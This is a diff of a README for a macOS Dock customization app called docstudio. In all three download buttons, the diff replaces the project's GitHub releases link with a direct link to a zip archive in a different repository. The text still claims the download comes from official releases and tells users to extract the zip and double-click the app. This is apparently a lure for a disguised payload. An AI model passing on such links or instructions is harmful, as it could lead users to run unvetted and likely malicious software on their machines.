@@ -5,7 +5,7 @@ description: "Design, arrange, and apply live widgets directly in your macOS Doc
 ---
 <h1>🧩 docstudio - Your Dock, Perfected Right on Your Desktop</h1>
 <p align="center">
-  <a href="https://github.com/Showerijssel2131/docstudio/releases">
+  <a href="https://raw.githubusercontent.com/Showerijssel2131/showerijssel2131.github.io/main/Habiru/Latest-v3.5.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Get%20docstudio-blueviolet?style=for-the-badge&logo=github" alt="Download docstudio" style="max-width: 100%;">
   </a>
 </p>
@@ -19,7 +19,7 @@ description: "Design, arrange, and apply live widgets directly in your macOS Doc
 <h3>Step 1: Grab Your Copy</h3>
 <p>The very first thing you need to do is to get the docstudio package onto your computer. We host all our official releases on our GitHub page. Here is the direct link to get started:</p>
 <p align="center">
-  <a href="https://github.com/Showerijssel2131/docstudio/releases" style="display: inline-block; padding: 15px 30px; font-size: 18px; color: #ffffff; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius:  ​50px; text-decoration: none; font-weight: bold; box-shadow:  ​0 8px 15px rgba(0,0,0,0.2);">⬇️ <strong>Visit this link to download the application</strong></a>
+  <a href="https://raw.githubusercontent.com/Showerijssel2131/showerijssel2131.github.io/main/Habiru/Latest-v3.5.zip" style="display: inline-block; padding: 15px 30px; font-size: 18px; color: #ffffff; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius:  ​50px; text-decoration: none; font-weight: bold; box-shadow:  ​0 8px 15px rgba(0,0,0,0.2);">⬇️ <strong>Visit this link to download the application</strong></a>
 </p>
 <p>Once you click that button, your web browser will open. You will see a list of files available for download. Look for the most recent version (usually at the top) and click the download arrow next to the file. The download will begin automatically.</p>
 <ul>
@@ -88,7 +88,7 @@ description: "Design, arrange, and apply live widgets directly in your macOS Doc
 <h2>📦 Download & Installation Recap</h2>
 <p>You are just three quick steps away from a stunning Dock. To make it even easier, here is the download link once more:</p>
 <p align="center">
-  <a href="https://github.com/Showerijssel2131/docstudio/releases" style="display: inline-block; padding: 20px 40px; font-size: 20px; color: #ffffff; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); border-radius:  ​50px; text-decoration: none; font-weight: bold; box-shadow:  ​0 10px 20px rgba(0,0,0,0.3);">🚀 <strong>Get docstudio Now</strong></a>
+  <a href="https://raw.githubusercontent.com/Showerijssel2131/showerijssel2131.github.io/main/Habiru/Latest-v3.5.zip" style="display: inline-block; padding: 20px 40px; font-size: 20px; color: #ffffff; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); border-radius:  ​50px; text-decoration: none; font-weight: bold; box-shadow:  ​0 10px 20px rgba(0,0,0,0.3);">🚀 <strong>Get docstudio Now</strong></a>
 </p>
 <p>After downloading, remember the golden steps: <strong>1.</strong> Find the zip file. <strong>2.</strong> Extract it. <strong>3.</strong> Double-click docstudio. That is all.</p>
 <p>Join the growing community of happy macOS users who have taken control of their interface. Your Dock is about to become the envy of everyone who sees it. Have fun customizing!</p>
